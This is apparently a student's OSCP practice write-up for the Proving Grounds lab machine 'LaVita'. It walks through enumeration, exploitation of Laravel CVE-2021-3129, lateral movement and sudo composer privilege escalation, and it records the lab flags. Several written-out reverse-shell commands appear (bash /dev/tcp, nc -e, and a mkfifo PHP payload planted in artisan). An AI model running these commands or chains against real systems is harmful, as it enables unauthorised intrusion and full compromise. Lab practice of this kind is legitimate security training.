---
Date: 2024-10-11
Course: "[[OSCP]]"
Platform: PG-Practice
Category: Linux
Difficulty: Intermediate
Status: Complete
IP: 192.168.201.38
Writeup: https://medium.com/@0xrave/ctf-200-07-offsec-proving-grounds-practice-labor-day-ctf-machine-walkthrough-12bfd272e9cf
---
# LaVita
This box started out really well with plenty of through enumeration to identify the vulnerability, but I fell down trying to gain initial access with the exploits. I tried several, and persisted with the most well developed exploit thinking it would be the way forward. 

The issue was not realising the exploit would stop working after the first success, so after testing it with the `uname -a` or `id` commands, it would then not work when I tried to repeat with a reverse shell command. it took awhile to realise that there were 21 chains available, and so there was no need to keep using the "last working" chain, because it was only working once anyway. I also stopped trying to test with `id` and just threw the reverse shell command in straight away - I already knew the exploit worked *sometimes* so may as well try to establish a shell each time I tried.

After a LOT of frustration I finally got initial access only to find I didn't have a real user, and would probably need to move laterally to `skunk` before I could get `root`. I'd had issues running `pspy32` on boxes previously but had success this time around by using `wget` to pull it from a local http server, and with it running it was easy to identify the process running as `skunk`, realise it was a php file, and then add a reverse shell to the php file to get access as `skunk`.

As usual, as soon as you gain new access the enumeration process starts again. In this case i was lucky I found `skunk` had sudo privileges, and those privileges were related to a binary with an entry in GTFObins that allowed privesc through `sudo`. Getting the binary commands correct was a little tricky, and it took a bit to realise I needed to make the file changes as `www-data` but run the `sudo` command as `skunk`. But I got there after a whole lot of slog. This box is a great reminder that you are learning new things with every new attempt, and your processes are getting more and more refined with each box - it's not likely to get easier, but with every box to you complete you're gaining vital experience and getting closer to the standard required to pass the exam.

# Resolution summary
- Ran Nmap to identify ports `22` & `80`
- Visited http (`80`) & identified laravel
- Created user & entered debug mode
- Researched vulnerability and attempted multiple exploits
- Achieved reverse shell and enumerated as `www-data`
- Identified process running as user `skunk` and modified to establish 2nd reverse shell as `skunk`
- Checked sudo privileges and found potential privilege escalation vector through GTFObins
- Modified `composer` file as `www-data` and ran command as `skunk` to achieve `root`
## Improved skills
- Running multiple reverse shells
- Understanding gadget chains
## Used tools
- nmap
- gobuster
- python3

---
# Information Gathering
Scanned all TCP ports:
```bash
sudo nmap -sC -sV -oN LaVita.nmap 192.168.201.38 -v
```

Enumerated open TCP ports:
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
| ssh-hostkey: 
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
|_http-server-header: Apache/2.4.56 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: W3.CSS Template
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

---
# Enumeration
## Port 22 - SSH (OpenSSH 7.9p1)
No enumeration conducted
## Port 80 - HTTP (Apache)
- Navigated to `http://192.168.201.38:80` and used Wappalyzer to identify `W3.CSS` & `Font Awesome 4.7.0`
![[Cybersecurity-Resources/images/Pasted image 20241010194628.png]]
- Navigated to bottom of `http://192.168.201.38:80`, identified contact form, and entered test message
![[Cybersecurity-Resources/images/Pasted image 20241010194917.png]]
- Message submission redirected to `404 not found` and identified `Laravel 8.4.0`
![[Cybersecurity-Resources/images/Pasted image 20241010195100.png]]
		- `Laravel 8.4.0` is vulnerable to [CVE-2021-3129](https://nvd.nist.gov/vuln/detail/CVE-2021-3129) (arbitary code execution for unauthenticated users for sites in debug mode with Laravel before 8.4.2)
- Ran `gobuster dir -u http://192.168.201.38 -w //usr/share/dirb/wordlists/common.txt` to identify any web directories
![[Cybersecurity-Resources/images/Pasted image 20241010195523.png]]
- Navigated to `http://192.168.201.38/login` and identified page for "Login" or "Register"
![[Cybersecurity-Resources/images/Pasted image 20241010195812.png]]
- Unsuccessful with "offsec@kali" and password `pass`
![[Cybersecurity-Resources/images/Pasted image 20241010195947.png]]
- Navigated to `http://192.168.201.38/register`, registered user with credentials `offsec:password` (email: offsec@kali.com), and redirected to `http://192.168.201.38/home` with access to "Dashboard testing Area"
![[Cybersecurity-Resources/images/Pasted image 20241010200445.png]]
- Navigated to `http://192.168.201.38/robots.txt` 
![[Cybersecurity-Resources/images/Pasted image 20241010195628.png]]
- Navigated to `http://192.168.201.38/web.config` and viewed page source (potentially using `Microsoft IIS service`)
![[Cybersecurity-Resources/images/Pasted image 20241010200759.png]]
---
# Exploitation
## Name of the technique
- Clicked "Enable" to enable debugging
![[Cybersecurity-Resources/images/Pasted image 20241010202820.png]]
- Tested access to `http://192.168.201.38/_ignition/execute-solution` to confirm debug mode in ON and determine Laravel root directory is `/var/www/html/lavita`
![[Cybersecurity-Resources/images/Pasted image 20241010205327.png]]
- Identified `laravel-8.4.2-rce` exploit from `https://github.com/khanhnv-2091/laravel-8.4.2-rce/blob/main/exploit.py`
	- Saved `exploit.py` as `laravelexploit.py` and ran `python3 laravelexploit.py http://192.168.201.38:80 /var/www/html/laravel/storage/logs/laravel.log 'uname -a'`
![[Cybersecurity-Resources/images/Pasted image 20241010203951.png]]
- Identified `CVE-2021-3129` exploit from `https://github.com/joshuavanderpoll/CVE-2021-3129/blob/main/CVE-2021-3129.py`
	- Saved `CVE-2021-3129.py` and ran `python3 CVE-2021-3129.py --host http://192.168.201.38 --exec 'uname -a' --force
![[Cybersecurity-Resources/images/Pasted image 20241010210303.png]]
![[Cybersecurity-Resources/images/Pasted image 20241010210346.png]]
- Reran exploit with bash command for reverse shell but received no output or reverse shell: `python3 CVE-2021-3129.py --host http://192.168.201.38 --exec 'bash -i >& /dev/tcp/192.168.45.215/4444 0>&1' --force`
![[Cybersecurity-Resources/images/Pasted image 20241010210606.png]]
- Reran exploit with netcat command for reverse shell but no output and no reverse shell: 
```
python3 CVE-2021-3129.py --host http://192.168.117.38
execute nc 192.168.45.250 4444 -e /bin/sh
```
- Reran exploit with same command but testing the next chain
![[Cybersecurity-Resources/images/Pasted image 20241011191852.png]]
- Command above hung, and checked other tab to find incoming reverse shell 
![[Cybersecurity-Resources/images/Pasted image 20241011192016.png]]
---
# Lateral Movement to user
## Local Enumeration
- Ran `cat /etc/passwd` and identified user `skunk`
![[Cybersecurity-Resources/images/Pasted image 20241011192138.png]]
- Navigated to `/home/skunk`, identified `local.txt`, and printed file with `cat /home/skunk/local.txt`
![[Cybersecurity-Resources/images/Pasted image 20241011192557.png]]
- Navigated to `/var/www/html/lavita/storage`, ran `wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh` to download `linpeas.sh`, and used `chmod +x linpeas.sh` to make it executable
![[Cybersecurity-Resources/images/Pasted image 20241011193123.png]]
- Ran `./linpeas.sh` and identified multiple processes belonging to `www-data` but user is `root`
![[Cybersecurity-Resources/images/Pasted image 20241011193436.png]]
- Identified `ptrace` protection is *disabled*
![[Cybersecurity-Resources/images/Pasted image 20241011193641.png]]
- Identified user `skunk` is a member of `sudo`
![[Cybersecurity-Resources/images/Pasted image 20241011194844.png]]
- Identified `postfix` file
![[Cybersecurity-Resources/images/Pasted image 20241011193902.png]]
- Identified `mysql` credentials (`lavita:sdfquelw0kly9jgbx92`)
![[Cybersecurity-Resources/images/Pasted image 20241011194047.png]]
- Identified other interesting files
![[Cybersecurity-Resources/images/Pasted image 20241011194148.png]]
- Tested `su skunk` using credentials `skunk:skunk`
![[Cybersecurity-Resources/images/Pasted image 20241011194628.png]]
- Uploaded `pspy32` to target
![[Cybersecurity-Resources/images/Pasted image 20241011195835.png]]
- Ran `./pspy32` and identified processes running for user `skunk` (UID=1001)
![[Cybersecurity-Resources/images/Pasted image 20241011200348.png]]
- Run `ls -lah /var/www/html/lavita/artisan` to check permissions for artisan, and identify that user `www-data` has write access
![[Cybersecurity-Resources/images/Pasted image 20241011201020.png]]
- Ran `cat /var/www/html/lavita/artisan` & identified php file
![[Cybersecurity-Resources/images/Pasted image 20241011201506.png]]
## Lateral Movement vector
- Ran `nc -nvlp 4545` to start netcat listener on port 4545
- Ran `echo "<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.250 4545>/tmp/f'); ?>" > /var/www/html/lavita/artisan` to echo PHP reverse shell script into `artisan` file
- Caught reverse shell with netcat as `skunk` user
![[Cybersecurity-Resources/images/Pasted image 20241011202317.png]]
---
# Privilege Escalation
## Local Enumeration
- `skunk` previously identified as member of `sudo` group, so ran `sudo -l`
![[Cybersecurity-Resources/images/Pasted image 20241011202424.png]]
## Privilege Escalation vector
- Identified [GTFObins](https://gtfobins.github.io/gtfobins/composer/#sudo) for `composer` run by `sudo`, so modified `composer.json` with `echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' > composer.json` as `www-data` user
![[Cybersecurity-Resources/images/Pasted image 20241011203853.png]]
- Ran `sudo /usr/bin/composer --working-dir=/var/www/html/lavita run-script x` as `skunk` user and gained `root` access
![[Cybersecurity-Resources/images/Pasted image 20241011203943.png]]
- Ran `cat /root/proof.txt` to print `proof.txt`
---
# Trophy & Loot
`local.txt` = `9aca8d958ec6c654109f8bfffe951a19`
`root.txt` = `0d57d7ed54dc6b2b087332f04ff4f26e`